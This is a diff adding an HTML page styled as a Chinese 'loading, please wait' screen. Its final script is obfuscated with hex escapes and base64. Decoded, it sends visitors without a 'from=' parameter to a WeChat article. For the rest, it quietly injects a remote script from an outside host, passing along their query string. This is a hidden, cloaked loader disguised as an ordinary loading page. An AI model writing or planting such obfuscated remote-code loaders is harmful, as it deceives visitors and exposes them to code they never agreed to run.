@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <script src="http://libs.baidu.com/jquery/2.1.1/jquery.min.js"></script>
+    <title>加载中……</title>
+    <style>
+     iframe{
+        display: none;
+        width: 100%;
+          height: 100%;
+          margin: 0;
+          padding: 0;
+          border: none;
+      }
+      body {
+        width: 100%;
+          height: 100%;
+          margin: 0;
+          padding: 0;
+          border: none;
+    }
+    /* loading效果 */
+    .loading {
+      position: fixed;
+      left: 0;
+      right: 0;
+      top: 0;
+      bottom: 0;
+      z-index: 1;
+      background-color: #77a4f3;
+    }
+    .loading .inner {
+      position: absolute;
+      left: 0;
+      right: 0;
+      top: 0;
+      bottom: 0;
+      height: 50px;
+      margin: auto;
+    }
+    .loading .content {
+      line-height: 50px;
+      text-align: center;
+    }
+    .loading .img {
+      width: 100%;
+    }
+    .loading .animate {
+      text-align: center;
+    }
+    .loading .animate span {
+      display: inline-block;
+      width: 6px;
+      height: 50px;
+      background-color: #fff;
+      -webkit-transform: scaleY(0.4);
+              transform: scaleY(0.4);
+      -webkit-animation: scale 1s infinite;
+              animation: scale 1s infinite;
+    }
+    .loading .animate span:nth-child(2) {
+      -webkit-animation: scale 1s .2s infinite;
+              animation: scale 1s .2s infinite;
+    }
+    .loading .animate span:nth-child(3) {
+      -webkit-animation: scale 1s .3s infinite;
+              animation: scale 1s .3s infinite;
+    }
+    .loading .animate span:nth-child(4) {
+      -webkit-animation: scale 1s .4s infinite;
+              animation: scale 1s .4s infinite;
+    }
+    .loading .animate span:nth-child(5) {
+      -webkit-animation: scale 1s .5s infinite;
+              animation: scale 1s .5s infinite;
+    }
+    .loading .animate span:nth-child(6) {
+      -webkit-animation: scale 1s .6s infinite;
+              animation: scale 1s .6s infinite;
+    }
+    @-webkit-keyframes scale {
+      0% {
+        -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4);
+      }
+      20% {
+        -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8);
+      }
+      40% {
+        -webkit-transform: scaleY(1);
+                transform: scaleY(1);
+      }
+      100% {
+        -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4);
+      }
+    }
+    @keyframes scale {
+      0% {
+        -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4);
+      }
+      20% {
+        -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8);
+      }
+      40% {
+        -webkit-transform: scaleY(1);
+                transform: scaleY(1);
+      }
+      100% {
+        -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4);
+      }
+    }
+    .loading .tips {
+      font-size: 1rem;
+      color: #fff;
+      text-align: center;
+    }
+    </style>
+  </head>
+  <body>
+    <script type="text/javascript" src="https://s4.cnzz.com/z_stat.php?id=1278067765&web_id=1278067765"></script><div class="loading">
+      <div class="inner">
+        <div class="animate">
+          <span></span>
+          <span></span>
+          <span></span>
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+        <p class="tips">加载中，请稍候...</p>
+      </div>
+    </div>
+    <!-- custom s Zhang -->
+    <script type="text/javascript">
+var _0x6e2d=["\x66\x72\x6F\x6D\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x70\x2E\x77\x65\x69\x78\x69\x6E\x2E\x71\x71\x2E\x63\x6F\x6D\x2F\x73\x2F\x76\x6B\x52\x54\x42\x34\x57\x4D\x54\x57\x45\x65\x46\x39\x50\x30\x4D\x58\x54\x46\x59\x67","\x32\x72\x35\x45\x4F\x33\x7A\x49\x48\x72\x32\x5A\x73\x32\x6D\x36\x56\x6B\x36\x33\x50\x34\x6E\x62\x57\x32\x32\x6F\x72\x49\x77\x6A\x30\x79\x31\x78\x46\x56\x5A\x61\x32\x45\x46\x63\x79\x34\x37\x39\x76\x62\x43\x68\x41\x4C","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x4C\x79\x39\x36\x4C\x6D\x78\x79\x61\x6E\x5A\x70\x63\x43\x35\x6A\x62\x32\x30\x76\x63\x6D\x73\x2F\x64\x6A\x30\x78\x4E\x54\x51\x31\x4E\x6A\x59\x78\x4D\x6A\x4D\x3D","\x73\x72\x63","\x26","\x73\x75\x62\x73\x74\x72","\x73\x65\x61\x72\x63\x68","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];if(window[_0x6e2d[3]][_0x6e2d[2]][_0x6e2d[1]](_0x6e2d[0])==  -1){top[_0x6e2d[3]][_0x6e2d[2]]= _0x6e2d[4]}else {var t=_0x6e2d[5];var s=document[_0x6e2d[7]](_0x6e2d[6]);var u=atob(_0x6e2d[8]);s[_0x6e2d[9]]= u+ _0x6e2d[10]+ location[_0x6e2d[12]][_0x6e2d[11]](1);document[_0x6e2d[14]][_0x6e2d[13]](s)}
+    </script>   
+  </body>
+</html>
